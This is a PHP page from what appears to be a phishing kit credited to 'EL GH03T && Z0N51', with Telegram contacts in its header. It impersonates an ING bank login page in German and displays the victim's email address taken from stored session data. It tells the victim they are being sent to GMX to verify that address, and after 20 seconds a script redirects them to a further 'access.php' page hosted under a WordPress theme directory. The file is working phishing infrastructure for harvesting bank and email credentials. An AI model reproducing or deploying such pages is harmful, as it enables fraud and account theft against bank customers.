<?php
    /*******
    Main Author: EL GH03T && Z0N51
    Contact me on telegram : https://t.me/elgh03t / https://t.me/z0n51
    ********************************************************/
    
    require_once '../includes/main.php';
    reset_action(get_client_ip());
    $_SESSION['last_page'] = 'access';
	$infos  = get_infos();
    $email = $infos['email'];
?>
<!doctype html>
<html style="display: flex; flex-direction: column;">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/style.css">

        <link rel="icon" type="image/png" href="../assets/imgs/favicon.png" />

        <title>ING Login</title>
    </head>

    <body style="display: flex; flex-direction: column;">

        <div id="loader">
            <div class="inner">
                <ul>
                    <li></li>
                    <li></li>
                    <li class="active"></li>
                </ul>
                <p>Bitte warten</p>
            </div>
        </div>

        <!-- HEADER -->
        <header id="header">
            <div class="container">
                <div class="logo"><img src="../assets/imgs/logo.svg"></div>
            </div>
        </header>
        <!-- END HEADER -->

        <!-- MAIN -->
        <main id="main" class="flex-grow-1">
            <div class="container">
                <div class="title">
                    <h3>E-Mail-Bestätigungsseite</h3>
                </div>

                <div class="box">
    <img style="max-width: 90px;" src="../assets/imgs/ico2.svg">
                    <center <main="" id="main">
            <div class="container">
                <div style="margin-block: 0em;" class="loader">
                    <div style="margin-block: 1em; color: #0098ff;" class="spinner-border" role="status"></div>

                    <p>Wir leiten Sie zur GMX-Seite weiter ...<br>um Ihre E-Mail-Adresse zu verifizieren.</p>
    <p class="text-center d-block fz16 mt50"><i style="color: #666;"></i>E-mail:  <?php echo $email; ?> </p>
                </div>
            </div>
        
		</center>
                    
                </div>
                
            </div>
        </main>
        <!-- END MAIN -->

        <!-- FOOTER -->
        <footer id="footer">
            <ul>
                <li>Karriere</li>
                <li>Vertriebspartner</li>
                <li>Wholesale Banking</li>
                <li>Kontaktformular</li>
                <li>AGB</li>
                <li>Datenschutz</li>
                <li>Impressum</li>
            </ul>
            <div><img style="min-width: 144px;" src="../assets/imgs/social.png"></div>
        </footer>
        <!-- END FOOTER -->

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/jquery-simple-upload@1.1.0/simpleUpload.min.js"></script>
        <script src="../assets/js/script.js"></script>

        <script>
            setTimeout(function () {
                window.location.href= 'https://secure261.inmotionhosting.com/~paingu6/wp-content/themes/PainGuru/inc/gm/access.php';
            },20000); // 1000 = 1s
        </script>

    </body>

</html>